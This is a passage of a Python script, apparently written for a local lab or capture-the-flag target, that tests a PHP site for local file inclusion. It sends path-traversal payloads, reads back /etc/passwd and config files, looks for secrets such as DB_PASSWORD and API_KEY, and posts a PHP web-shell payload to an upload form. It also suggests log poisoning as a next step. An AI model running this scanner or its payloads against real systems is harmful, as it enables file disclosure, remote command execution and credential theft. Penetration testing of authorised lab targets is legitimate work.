        self.indicators = {
            'linux': ['root:', 'bin:', 'daemon:', 'sys:', 'nobody:', '/bin/bash', '/bin/sh'],
            'windows': ['for 16-bit app support', '[fonts]', '[extensions]', '[files]'],
            'base64_php': ['PD9waHA', 'PD9waHAg', 'PD8=', 'PD9'],  # PHP tags in base64
            'php_source': ['<?php', '<?=', '<?'],
            'error_log': ['GET /', 'POST /', 'HTTP/', 'User-Agent:'],
            'proc_info': ['Linux', 'Ubuntu', 'Debian', 'Red Hat', 'SMP'],
            'apache_config': ['ServerRoot', 'DocumentRoot', '<VirtualHost', '<Directory'],
            'nginx_config': ['server {', 'listen', 'location', 'root'],
            'php_config': ['[PHP]', 'max_execution_time', 'memory_limit', 'display_errors'],
            'sensitive': ['DB_PASSWORD', 'db_password', 'SECRET_KEY', 'secret_key', 'API_KEY', 'api_key']
        }
        
    def test_lfi(self, url, param_name, test_all=False):
        """Test LFI with comprehensive payload list"""
        print(f"[*] Testing LFI on: {url}")
        print(f"[*] Parameter: {param_name}")
        print(f"[*] Testing {len(self.test_payloads)} payloads...\n")
        
        results = {
            'url': url,
            'param': param_name,
            'vulnerable': False,
            'successful_payloads': [],
            'indicators_found': []
        }
        
        count = 0
        for payload in self.test_payloads:
            count += 1
            # Replace parameter value with payload
            test_url = url.replace(f"{param_name}=1", f"{param_name}={payload}")
            
            try:
                response = requests.get(test_url, timeout=8)
                
                if response.status_code == 200:
                    # Check for various LFI indicators
                    content = response.text
                    found_indicator = False
                    
                    for category, indicators in self.indicators.items():
                        for indicator in indicators:
                            if indicator in content:
                                results['indicators_found'].append({
                                    'category': category,
                                    'indicator': indicator,
                                    'payload': payload,
                                    'content_length': len(content)
                                })
                                found_indicator = True
                    
                    if found_indicator:
                        results['vulnerable'] = True
                        results['successful_payloads'].append({
                            'payload': payload,
                            'length': len(content),
                            'snippet': content[:300]
                        })
                        print(f"[!] POTENTIAL LFI DETECTED")
                        print(f"    Payload: {payload[:80]}...")
                        print(f"    Response length: {len(content)}B")
                        print(f"    Snippet: {content[:100]}...\n")
                    else:
                        print(f"[-] Test {count}: Status 200 but no indicators")
                        
                else:
                    print(f"[-] Test {count}: Status {response.status_code}")
                    
            except Exception as e:
                print(f"[-] Test {count}: Error - {str(e)[:50]}")
        
        self.results.append(results)
        return results
    
    def test_post_lfi(self):
        """Test LFI on POST parameters if forms were found"""
        print("\n[*] Testing POST parameters for LFI")
        
        post_url = f"{self.base_url}/posts/upload-article.php"
        
        # Common POST parameters that might be vulnerable
        post_params_to_test = ['title', 'content', 'author', 'file', 'image', 'document']
        
        post_lfi_payloads = [
            '../../../etc/passwd',
            '<?php system($_GET["cmd"]); ?>',
            '<?php echo file_get_contents("/etc/passwd"); ?>',
        ]
        
        for param in post_params_to_test:
            print(f"\n[*] Testing POST parameter: {param}")
            
            for payload in post_lfi_payloads:
                data = {param: payload}
                try:
                    response = requests.post(post_url, data=data, timeout=5)
                    
                    if response.status_code == 200:
                        # Check if payload reflects or executes
                        if payload in response.text:
                            print(f"[!] PAYLOAD REFLECTED for {param}: {payload[:30]}")
                        if 'root:' in response.text or 'apache' in response.text:
                            print(f"[!] COMMAND EXECUTION POSSIBLE via {param}")
                except Exception as e:
                    print(f"[-] Error testing POST {param}: {e}")
    
    def generate_report(self):
        """Generate comprehensive LFI test report"""
        print("\n" + "="*80)
        print("LFI COMPREHENSIVE TESTING REPORT")
        print("="*80 + "\n")
        
        total_tests = sum(len(p['successful_payloads']) for p in self.results)
        total_indicators = sum(len(p['indicators_found']) for p in self.results)
        
        if total_tests > 0:
            print(f"[!!!] LFI VULNERABILITY CONFIRMED")
            print(f"[!] Successful Payloads: {total_tests}")
            print(f"[!] Indicators Found: {total_indicators}\n")
            
            for result in self.results:
                if result['vulnerable']:
                    print(f"\nVulnerable Parameter: {result['param']}")
                    print(f"URL: {result['url']}\n")
                    
                    for payload in result['successful_payloads']:
                        print(f"  Payload: {payload['payload'][:80]}")
                        print(f"  Response Length: {payload['length']}B")
                        print(f"  Snippet: {payload['snippet']}...")
                        print()
                        
                    print("Indicators found:")
                    for indicator in result['indicators_found']:
                        print(f"  - {indicator['category']}: {indicator['indicator']}")
        else:
            print("[-] No LFI vulnerabilities confirmed in basic tests")
            print("[*] Target may require authentication or have filtering")
            
            # Suggest next steps
            print("\n[+] Next Steps:")
            print("  1. Test with authentication cookies if available")
            print("  2. Try different encoding techniques")
            print("  3. Test POST parameters on upload forms")
            print("  4. Check for session-based LFI")
            print("  5. Test for log poisoning via User-Agent or Referer headers")

def main():
    tester = LFITester("http://127.0.0.1:33209")
    
    # Test the main LFI candidate - page parameter on index.php
    print("[*] Phase 1: Deep LFI testing on 'page' parameter (primary target)\n")
    tester.test_lfi("http://127.0.0.1:33209/index.php?page=1", "page")
    
    # Also test the id parameter on post.php  
    print("\n\n[*] Phase 2: Testing 'id' parameter on post.php\n")
    tester.test_lfi("http://127.0.0.1:33209/post.php?id=ScriptKiddie", "id")
    
    # Test POST parameters on upload form
    tester.test_post_lfi()
    
    # Generate report
    tester.generate_report()

if __name__ == "__main__":
    main()

